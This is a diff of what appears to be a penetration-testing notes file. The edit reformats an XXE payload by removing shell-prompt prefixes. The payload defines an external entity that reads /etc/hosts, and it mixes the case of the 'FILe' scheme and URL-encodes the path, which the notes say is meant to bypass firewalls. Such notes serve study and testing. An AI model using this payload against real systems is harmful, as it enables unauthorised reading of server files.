@@ -209,11 +209,11 @@ XXE standard:
 * NOTE: "FILe" upper/lowercase mix was to bypass firewalls
 * Use a valid XML feed, otherwise it will probably fail to parse. i.e. chuck `&xxe;` in legit xml elements in the feed.
 ```
-$ <?xml version="1.0" encoding="UTF-8"?>
-$ <!DOCTYPE data [
-$         <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
-$ ]>
-$ <element>&xxe;</element>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+        <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
+]>
+<element>&xxe;</element>
 ```
 
 XXE Out-of-Bounds attack:
